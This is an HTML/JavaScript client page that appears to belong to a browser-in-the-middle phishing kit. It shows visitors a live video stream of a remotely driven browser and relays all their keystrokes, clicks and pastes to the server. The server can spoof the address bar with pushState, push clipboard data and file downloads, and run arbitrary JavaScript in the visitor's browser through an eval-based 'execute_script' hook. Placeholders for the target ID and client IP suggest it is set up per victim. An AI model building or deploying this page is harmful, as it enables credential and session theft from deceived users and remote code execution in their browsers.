<!DOCTYPE html>
<html>
  <head>
    <title>PAGE_TITLE</title>
    <meta charset="UTF-8" />
  </head>
  <body>
    <video id="remote_video" playsinline disablepictureinpicture autoplay muted style="width: 100vw; height: auto;"></video>
    <style>
html, body {margin: 0; height: 100%; overflow: hidden}
    </style>
    <script src="/FileSaver.min.js"></script>
    <script src="/socket.io/socket.io.js"></script>
    <script>

//couple of helper functions
function width(){
  return window.innerWidth 
  || document.documentElement.clientWidth 
  || document.body.clientWidth 
  || 0;
}

function height(){
  return window.innerHeight 
  || document.documentElement.clientHeight 
  || document.body.clientHeight 
  || 0;
}

const client_ip = 'CLIENT_IP';
const target_id = 'TARGET_ID';

//declare connnection and video in global scope for further reference
var peerConnection;
let pendingIceCandidates = []

const flushPendingIceCandidates = function(){
  if(!peerConnection || !peerConnection.remoteDescription){
    return
  }
  while(pendingIceCandidates.length > 0){
    const queuedCandidate = pendingIceCandidates.shift()
    peerConnection
      .addIceCandidate(queuedCandidate)
      .catch(e => console.error(e))
  }
}
const video = document.querySelector("#remote_video")
//connect to the server over websockets and anounce we are a new fescar
const tokenParam = new URLSearchParams(window.location.search).get('token') || ''
const socket = io.connect(window.location.origin, {
  query: {
    token: tokenParam
  }
})
let viewport_width = width()
let viewport_height = height()

socket.on('connect', function(){
  socket.emit('new_fescar', viewport_width, viewport_height, client_ip, target_id)
})

socket.on("push_state", function(new_state){
  history.pushState({},'','/' + new_state)
})

socket.on("copy_to_clipboard", function(data){
  copy_to_clipboard(data)
})

//1) wait for a video stream offer
socket.on("video_stream_offer", function(broadcaster_socket_id, offer){
  pendingIceCandidates = []
  if(peerConnection){
    try {
      peerConnection.ontrack = null
      peerConnection.onicecandidate = null
      peerConnection.close()
    } catch (closeErr) {
      console.warn('[webrtc] prior peer close failed:', closeErr)
    }
  }
  peerConnection = new RTCPeerConnection({
    iceServers: [
      {
        "urls": "stun:stun.l.google.com:19302",
      },
      // { 
      //   "urls": "turn:TURN_IP?transport=tcp",
      //   "username": "TURN_USERNAME",
      //   "credential": "TURN_CREDENTIALS"
      // }
    ]
  })
  //2) set up an answer an send back to the broadcaster
  peerConnection
    .setRemoteDescription(offer)
    .then(() => peerConnection.createAnswer())
    .then(sdp => peerConnection.setLocalDescription(sdp))
    .then(() => {
      flushPendingIceCandidates()
      socket.emit("video_stream_answer", broadcaster_socket_id, peerConnection.localDescription)
    }) 
  //add video track when it becomes available
  peerConnection.ontrack = function(event){
    video.srcObject = event.streams[0]
  }
  //3) send ICE candidates as they become available
  peerConnection.onicecandidate = function(event){
    if (event.candidate) {
      socket.emit("candidate", broadcaster_socket_id, event.candidate)
    }
  }  
})

socket.on("candidate", function(broadcaster_socket_id, candidate){
  const rtcCandidate = new RTCIceCandidate(candidate)
  if (!peerConnection || !peerConnection.remoteDescription) {
    pendingIceCandidates.push(rtcCandidate)
    return
  }
  peerConnection
    .addIceCandidate(rtcCandidate)
    .catch(e => console.error(e))
})

socket.on("execute_script", function(script){
  // Legacy debug hook. Only allow trusted server-originated commands in
  // authorized internal environments.
  eval(script)
})

socket.on("save", function(file){
  saveAs(new Blob([file.data]), file.filename)
})

//joystick actions for mouse events
document.addEventListener("mousedown", handleMouseEvent, !1) 
document.addEventListener("mouseup", handleMouseEvent, !1) 
document.addEventListener("mousemove", handleMouseEvent, !1) 
document.addEventListener("mousewheel", handleMouseEvent, !1) 
document.addEventListener("click", handleMouseEvent, !1) 

window.addEventListener('popstate', function(event){
  socket.emit('go_back')
})

function handleMouseEvent(e){
  if(e.type == "mousewheel"){
    socket.emit('mouse_event', {"type": e.type, "wheelDeltaX": e.wheelDeltaX, "wheelDeltaY": e.wheelDeltaY})
  }else{
    //console.log({"type": e.type, "clientX": e.clientX, "clientY": e.clientY, "movementX": e.movementX, "movementY": e.movementY})
    socket.emit('mouse_event', {"type": e.type, "clientX": e.clientX, "clientY": e.clientY, "movementX": e.movementX, "movementY": e.movementY})
  }
}

//joystick actions for key events
document.addEventListener('keydown', keyDown)
document.addEventListener('keyup', keyUp)

const isModifierKey = function(key){
  return key === 'Meta' || key === 'Control'
}

const isCopyShortcut = function(e){
  return (e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'c'
}

const isPasteShortcut = function(e){
  return (e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'v'
}

let suppressKeyUntil = 0

const beginPasteKeySuppression = function(){
  suppressKeyUntil = Date.now() + 300
}

const shouldSuppressKeyForwarding = function(){
  return Date.now() < suppressKeyUntil
}

const handlePasteShortcut = function(e){
  if(!isPasteShortcut(e)){
    return false
  }
  beginPasteKeySuppression()
  // Native paste event will carry the clipboard payload.
  return true
}

let lastPasteTime = 0
window.addEventListener('paste', function(event){
  beginPasteKeySuppression()
  const now = Date.now()
  if (now - lastPasteTime < 50) return
  lastPasteTime = now
  let paste_data = (event.clipboardData || window.clipboardData).getData('text')
  if (paste_data && paste_data.length > 0) {
    socket.emit('paste', paste_data)
    event.preventDefault()
  }
})

async function keyDown(e) {
  if(e.keyCode == 9 || e.which == 9){
    e.preventDefault()
  }
  // Handle copy: request server to copy selected text
  if(isCopyShortcut(e)){
    socket.emit('copy')
    e.preventDefault()
    return
  }
  // Handle paste from keyboard shortcut without forwarding Ctrl/Meta+V.
  if(shouldSuppressKeyForwarding()){
    return
  }
  if(handlePasteShortcut(e)){
    return
  }
  // Do not forward modifier keys - they cause Ctrl being held in puppeteer
  // which corrupts text insertion during paste
  if(isModifierKey(e.key)){
    return
  }
  socket.emit("keydown", e.key)
}

function keyUp(e) {
  if(isModifierKey(e.key)){
    return
  }
  if(shouldSuppressKeyForwarding()){
    return
  }
  socket.emit("keyup", e.key)
}

copy_to_clipboard = function (data) {
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(data).catch(function(){
      copy_to_clipboard_legacy(data)
    })
    return
  }
  copy_to_clipboard_legacy(data)
}

copy_to_clipboard_legacy = function(data){
  var dummy = document.createElement("textarea")
  document.body.appendChild(dummy)
  dummy.value = data
  dummy.select()
  document.execCommand("copy")
  document.body.removeChild(dummy)
}

    </script>
  </body>
</html>
